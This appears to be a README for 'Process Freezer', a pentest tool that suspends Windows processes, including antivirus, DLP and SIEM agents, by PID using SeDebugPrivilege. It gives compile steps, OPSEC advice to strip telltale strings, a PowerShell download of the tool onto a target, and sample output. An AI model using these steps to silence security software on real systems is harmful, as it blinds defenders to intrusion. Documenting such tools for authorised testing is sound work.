### Process Freezer
---------------------------------------
This C program enables a user with local administrator rights on a Windows machine to suspend or resume running processes with various integrity levels (Medium, High, System) by PID.
When executed with elevated privileges (local admin), it enables 'SeDebugPrivilege' to open a handle and suspend processes (call 'NtSuspendProcess') as long as they are not protected by mechanisms such as Protected Process Light (PPL).

It can be particularly useful during internal penetration tests when you need to temporarily suspend (rather than terminate) processes associated with security solutions such as DLP agents, SIEM collectors, or antivirus software, provided they are not protected (e.g., not running as PPL or with anti-tampering features disabled).

Warning: Be carefull, suspending critical OS processes may destabilize or crash the operating system. Use with caution and at your own risks.

#### USAGE
- STEP 1 - Compile the source code.  
<i/> OPSEC advice: remove all existing comments and most 'printf' statements from the source code before compiling. </i>
```
Example with Visual Studio 2022 Developer Command Prompt v17.14.14:
-------------------------------------------------------------------
Basic:
+ c:\path-to-project\ProcessFreezer> cl impersonator.c /link advapi32.lib
With an icon:
+ c:\path-to-project\ProcessFreezer>> echo IDI_ICON1 ICON "myicon.ico" > appicon.rc
+ c:\path-to-project\ProcessFreezer>> rc appicon.rc
+ c:\path-to-project\ProcessFreezer>> cl impersonator.c /link advapi32.lib /OUT:ProcessFreezer>.exe appicon.res
```

- STEP 2 - On your target Windows machine, run the command 'tasklist -v' to display all running processes along with detailed information.
The objective is to identify the PIDs that you want to suspend.
```
--------
C:\Temp> tasklist -v

Image Name                     PID Session Name        Session#    Mem Usage Status          User Name                                              CPU Time Window Title   
========================= ======== ================ =========== ============ =============== ================================================== ============ ============================================
<SNIP>
SecHealthUI.exe              15248 Console                    1     95,488 K Running         LAB\pentester                                           0:00:00 Windows Security
svchost.exe                   7704 Services                   0     11,864 K Unknown         AUTORITE NT\SERVICE LOCAL                               0:00:00 N/A
SecurityHealthHost.exe       12056 Console                    1      9,524 K Unknown         LAB\pentester                                           0:00:00 N/A
notepad++.exe                14788 Console                    1     29,840 K Running         LAB\pentester                                           0:00:00 C:\Users\pentester\Documents\Tools-Pentest\ap
notepad.exe                   6320 Console                    1     13,512 K Running         NT AUTHORITY\SYSTEM                                     0:00:00 Sans titre - Bloc-notes
tasklist.exe                  6800 Console                    1     10,620 K Unknown         LAB\pentester                                           0:00:00 N/A     
<SNIP>
```

- STEP 3 - Upload and use the tool 'ProcessFreezer' to temporarily suspend processes with various integrity levels (Medium, High, System) as long as they are not protected by mechanisms such as Protected Process Light (PPL).
```
C:\Temp> powershell -c "wget -uri https://URL/ProcessFreezer.exe -OutFile C:\temp\ProcessFreezer.exe"

Examples - Suspend process
--------------------------
C:\Temp> ProcessFreezer.exe -freeze 6320
Process 6320 opened successfully.
Running as SYSTEM: Yes
Integrity Level: System
Process 6320 suspended successfully.

C:\Temp> ProcessFreezer.exe -freeze 14788
Process 14788 opened successfully.
Running as SYSTEM: No
Integrity Level: Medium
Process 14788 suspended successfully.

Examples - Unsuspend process
----------------------------
C:\Temp> ProcessFreezer.exe -unfreeze 6320
Process 6320 opened successfully.
Running as SYSTEM: Yes
Integrity Level: System
Process 6320 resumed successfully.

C:\Temp> ProcessFreezer.exe -unfreeze 14788
Process 14788 opened successfully.
Running as SYSTEM: No
Integrity Level: Medium
Process 14788 resumed successfully.
```

#### LICENSE
GNU General Public License v3.0
